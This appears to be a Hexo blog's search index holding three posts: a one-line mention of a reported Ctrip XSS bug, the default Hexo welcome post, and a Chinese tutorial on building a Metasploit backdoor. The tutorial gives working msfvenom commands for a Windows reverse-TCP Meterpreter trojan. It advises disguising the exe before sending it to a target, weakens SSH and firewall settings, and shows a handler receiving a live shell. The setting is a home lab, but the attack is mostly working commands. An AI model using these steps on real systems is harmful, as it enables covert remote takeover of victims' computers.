<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[SRC]]></title>
    <url>%2F2019%2F08%2F09%2FSRC%2F</url>
    <content type="text"><![CDATA[记录第一个中危漏 携程XSS 漏洞 漏洞编号vulbox-2019-0201455]]></content>
  </entry>
  <entry>
    <title><![CDATA[metasploit之后门的生成]]></title>
    <url>%2F2019%2F08%2F09%2Fmetasploit%2F</url>
    <content type="text"><![CDATA[后门简介后门程序一般是指那些绕过安全性控制而获取对程序或系统访问权的程序方法。在软件的开发阶段，程序员常常会在软件内创建后门程序以便可以修改程序设计中的缺陷。但是，如果这些后门被其他人知道，或是在发布软件之前没有删除后门程序，那么它就成了安全风险，容易被黑客当成漏洞进行攻击。etasploit可以生成多种多样的后门，比如windows、linux、java、php等。 实验环境Kali linux ip 192.168.10.128 WIN7 ip 10.0.2.2 选择以下攻击载荷并生成一个exe的木马程序 命令msfconsole 开启Metasploit 查看payload，使用命令show payloads，msf提供了多种攻击载荷 选择以下攻击载荷（使用TAB键自动补全），并生成一个exe的木马程序 msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.128 lport=4444 -f exe -o /123.exe 其中，lhost为kali linx的IP地址 生成的exe文件存放在根目录下 使用命令 cd /，可以看到我们生成的exe文件 接下来，我们需要把生成的exe文件伪装成其他文件发送到目标机上。由于实验机环境限制，为了把我们生成的exe上传到目标机上，这里我们需要使用Putty这个工具，将生成的exe文件传到win7虚拟机上。 为了不出现连接被拒绝的情况，我们首先要在kali linux上打开ssh服务，并且关闭win7防火墙。 在kali linux上打开ssh服务的方法： apt-get install openssh-server#安装 一、配置SSH参数 修改sshd_config文件，命令为： vi /etc/ssh/sshd_config 将#PasswordAuthentication no的注释去掉，并且将NO修改为YES，kali中默认是yes 右击桌面，单击打开终端，输入命令 将PermitRootLogin without-password修改为 PermitRootLogin yes 二、启动SSH服务 命令为： /etc/init.d/ssh start 或者 service ssh start 查看SSH服务状态是否正常运行，命令为 /etc/init.d/ssh status 或者service ssh status 那么需要生成两个密钥： ssh-keygen -t dsa -f /etc/ssh/ssh_host_dsa_key ssh-keygen -t dsa -f /etc/ssh/ssh_host_rsa_key 执行命令后都会让输入密码，直接敲回车设置为空即可 Win7关闭防火墙的方法 接着打开win7上win+R输入psftp.exe，使用命令 open192.168.10.128 ，连接到kali linux，使用cd /跳转到根目录下，使用命令get 文件名把文件下载到本地。 在msf中设置监听 use exploit/multi/handler show options 设置我们后门生成时的攻击载荷 set payload windows/meterpreter/reverse_tcp show options set payload windows/meterpreter/reverse_tcp payload =&gt; windows/meterpreter/reverse_tcp 设置参数（与后门的参数相对应） msf exploit(multi/handler) &gt; set LHOST 192.168.10.128 LHOST =&gt; 192.168.10.128 msf exploit(multi/handler) &gt; set LPORT 4444 LPORT =&gt; 4444 msf exploit(multi/handler) &gt; run 在windows主机上点击123.exe。当被攻击者运行了我们上传的后门程 序时，会弹回一个shell [*] Started reverse TCP handler on 192.168.10.128:4444 [*] Sending stage (179779 bytes) to 192.168.10.1 [*] Sleeping before handling stage… [*] Meterpreter session 1 opened (192.168.10.128:4444 -&gt; 192.168.10.1:53292) at 2019-07-28 14:08:08 +0800 实验结束]]></content>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2019%2F08%2F08%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
  </entry>
</search>
